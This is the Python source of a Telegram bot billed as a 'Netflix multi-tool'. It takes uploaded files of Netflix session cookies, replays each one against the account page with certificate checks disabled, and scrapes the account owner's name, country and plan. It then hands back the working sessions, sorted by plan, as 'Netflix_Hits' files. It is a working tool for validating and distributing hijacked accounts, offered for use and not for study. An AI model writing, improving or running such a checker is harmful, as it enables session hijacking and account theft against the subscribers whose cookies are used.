import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import http.server
import socketserver
from collections import OrderedDict, defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

# ----------------- कॉन्फिगरेशन -----------------
TOKEN = os.environ.get('BOT_TOKEN', "Bot Token Here")
OWNER_ID = 1115202962
ADMIN_IDS = [1115202962]
WATERMARK = "Made By @ShinchanNoharaTG | @M3UIndiaOriginal"

MAX_WORKERS = 15
COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

ALL_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", "flwssn", "memclid"}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

user_locks = defaultdict(asyncio.Lock)
user_state = {}

START_MSG = (
    "<code>\n"
    " █ NETFLIX MULTI-TOOL BOT █\n\n"
    "[ Step 1 ] Choose mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file\n"
    "[ Step 3 ] Get results\n"
    "</code>"
)

MAIN_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
     InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
    [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
     InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")]
])

CHECK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")]
])

RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 Get as .txt", callback_data="result_txt"),
     InlineKeyboardButton("📦 Get as .zip", callback_data="result_zip")]
])

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ----------------- 24x7 Pinger & Server -----------------
class PingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server Active")
    def log_message(self, format, *args):
        return

def run_always_on_pinger():
    time.sleep(20)
    while True:
        try:
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://checker-9kyv.onrender.com")
            requests.get(render_url, timeout=12)
        except: 
            pass
        time.sleep(540)

def run_http_server():
    PORT = int(os.environ.get("PORT", 5000))
    with socketserver.TCPServer(("", PORT), PingHandler) as httpd:
        httpd.serve_forever()

# ----------------- पार्सिंग फंक्शन्स -----------------
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except:
        pass
    return html_mod.unescape(val).encode('utf-8', errors='replace').decode('utf-8', errors='replace')

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in ALL_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
            elif isinstance(obj, list):
                merged = {c.get("name"): c.get("value") for c in obj if isinstance(c, dict) and c.get("name") in ALL_COOKIE_NAMES}
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    netscape_entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            name, value = parts[5], parts[6]
            if name in ALL_COOKIE_NAMES:
                netscape_entries.append({"name": name, "value": value})
    
    if netscape_entries:
        merged = {e["name"]: e["value"] for e in netscape_entries}
        if merged.get('NetflixId'):
            results.append(("netscape_all", merged))
            
    return results

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir() or info.filename.startswith('__MACOSX'):
                continue
            if info.filename.lower().endswith(('.txt', '.json', '.rar', '.zip')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except:
                        continue
    return cookies

def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId'}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml'}
    try:
        r = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, verify=False)
        if r.status_code != 200 or 'login' in r.url.lower() or 'signin' in r.url.lower():
            return {'ok': False, 'reason': 'Dead'}
        
        txt = r.text
        def find(pat):
            m = re.search(pat, txt)
            return clean_unicode(m.group(1)) if m else "Unknown"

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"')
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
        plan = find(r'"localizedPlanName".*?"value":"([^"]+)"')
        if plan == "Unknown":
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
            
        on_hold = "isUserOnHold" in txt and "true" in re.search(r'"isUserOnHold"\s*:\s*(true|false)', txt).group(1) if re.search(r'"isUserOnHold"\s*:\s*(true|false)', txt) else False

        return {
            'ok': True, 'premium': True, 'on_hold': on_hold,
            'name': name if name != "Unknown" else "Unknown",
            'country': country if country != "Unknown" else "IN",
            'plan': plan if plan != "Unknown" else "Premium",
            'cookie': cookie_dict
        }
    except:
        return {'ok': False, 'reason': 'Error'}

# ----------------- टेलिग्राम हँडलर्स -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_state[user_id] = {'mode': 'check', 'cookies': []}
    await update.message.reply_html(START_MSG, reply_markup=MAIN_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    modes = {"mode_check": "check", "mode_nftoken": "nftoken", "mode_clean": "clean", "mode_tvlogin": "tvlogin"}
    if query.data in modes:
        mode = modes[query.data]
        user_state[user_id] = {'mode': mode, 'cookies': []}
        await query.answer("Mode selected!")
        await context.bot.send_message(query.message.chat_id, f"✅ Mode: <b>{mode.upper()}</b>\n\nNow send your <b>.txt</b>, <b>.zip</b> or <b>.rar</b> file!", parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        return
    user_id = update.effective_user.id
    if user_id not in user_state:
        user_state[user_id] = {'mode': 'check', 'cookies': []}
        
    mode = user_state[user_id].get('mode', 'check')
    file = await update.message.document.get_file()
    filename = update.message.document.file_name.lower()
    
    with tempfile.TemporaryDirectory() as td:
        tp = os.path.join(td, update.message.document.file_name)
        await file.download_to_drive(tp)
        
        if filename.endswith('.zip') or filename.endswith('.rar'):
            cookies = await extract_cookies_from_zip(tp)
        else:
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            if mode == "clean":
                parsed = parse_cookie_file(content)
                if parsed:
                    netscape_str = dict_to_netscape(parsed[0][1])
                    buf = io.BytesIO(netscape_str.encode("utf-8"))
                    buf.seek(0)
                    await update.message.reply_document(document=InputFile(buf, filename="cleaned_cookies.txt"), caption="🧹 <b>Here is your cleaned cookie file!</b>", parse_mode='HTML')
                else:
                    await update.message.reply_text("❌ No valid cookies found to clean!")
                return
            parsed = parse_cookie_file(content)
            cookies = [(f"cookie_{i}", c) for i, (_, c) in enumerate(parsed)]
            
        if not cookies:
            await update.message.reply_text("❌ No valid Netflix cookies found in the file!")
            return
            
        user_state[user_id]['cookies'] = cookies
        await update.message.reply_html(f"✅ Loaded <b>{len(cookies)}</b> cookies successfully!\n\nClick below to start processing.", reply_markup=CHECK_MARKUP)

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    cookies = user_state.get(user_id, {}).get('cookies', [])
    
    if not cookies:
        await query.answer("No cookies loaded! Please upload a file first.")
        return
        
    await query.answer("Processing started...")
    status_msg = await query.message.reply_text(f"⏳ Processing <b>{len(cookies)}</b> cookies...", parse_mode='HTML')
    
    start_time = time.time()
    total = len(cookies)
    sub_found = 0
    free = 0
    on_hold = 0
    dead = 0
    errors = 0
    
    premium_4k = 0
    standard = 0
    basic = 0
    mobile = 0
    other = 0
    
    valid_hits = []
    
    for nm, ck in cookies:
        res = check_netflix_cookie(ck)
        if res.get('ok'):
            sub_found += 1
            if res.get('on_hold'):
                on_hold += 1
            
            p_lower = res.get('plan', '').lower()
            if 'ultra' in p_lower or '4k' in p_lower or 'premium' in p_lower:
                premium_4k += 1
            elif 'standard' in p_lower:
                standard += 1
            elif 'basic' in p_lower:
                basic += 1
            elif 'mobile' in p_lower:
                mobile += 1
            else:
                other += 1
                
            valid_hits.append(res)
        else:
            reason = res.get('reason', '')
            if reason == 'Dead':
                dead += 1
            else:
                errors += 1
                
    elapsed = max(int((time.time() - start_time) * 1000), 1)
    avg_speed = elapsed // max(total, 1)
    
    user_state[user_id]['valid_hits'] = valid_hits
    
    result_text = (
        f"⏭️ Checking!\n\n"
        f"💯 Total: {total}\n"
        f"🏆 Subscription found: {sub_found}\n"
        f"🆓 Free: {free}\n"
        f"⏸ On Hold: {on_hold}\n"
        f"💀 Dead: {dead}\n"
        f"⚠️ Errors: {errors}\n"
        f"⏱️ Average speed: {avg_speed} ms/cookie\n\n"
        f"📹 Plan breakdown:\n\n"
        f"👑 Premium (4K/UHD): {premium_4k}\n"
        f"📺 Standard: {standard}\n"
        f"📱 Basic: {basic}\n"
        f"📲 Mobile: {mobile}\n"
        f"🌐 Other: {other}\n\n"
        f"⭐ Choose output format :-"
    )
    
    await status_msg.edit_text(result_text, reply_markup=RESULT_MARKUP)

async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('valid_hits', [])
    
    if not hits:
        await query.answer("No hits available!")
        return
        
    lines = []
    for idx, h in enumerate(hits, 1):
        lines.append(f"Name: {h.get('name')} | Country: {h.get('country')} | Plan: {h.get('plan')}")
        lines.append(dict_to_netscape(h.get('cookie', {})))
        lines.append("-" * 40)
        
    buf = io.BytesIO(("\n".join(lines)).encode("utf-8"))
    buf.seek(0)
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename="Netflix_Hits.txt"), caption=f"📄 Here is your .txt file!\n{WATERMARK}")
    await query.answer("Sent txt!")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('valid_hits', [])
    
    if not hits:
        await query.answer("No hits available!")
        return
        
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, h in enumerate(hits, 1):
            netscape_content = dict_to_netscape(h.get('cookie', {}))
            zf.writestr(f"hit_{idx}_{h.get('country')}_{h.get('plan')}.txt", netscape_content)
            
    zip_buf.seek(0)
    await context.bot.send_document(query.message.chat_id, document=InputFile(zip_buf, filename="Netflix_Hits.zip"), caption=f"📦 Here is your .zip file containing all working cookies!\n{WATERMARK}")
    await query.answer("Sent zip!")

# ----------------- मुख्य कार्यान्वयन (Main) -----------------
if __name__ == "__main__":
    os.makedirs(COOKIES_DIR, exist_ok=True)
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    
    threading.Thread(target=run_always_on_pinger, daemon=True).start()
    threading.Thread(target=run_http_server, daemon=True).start()
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)
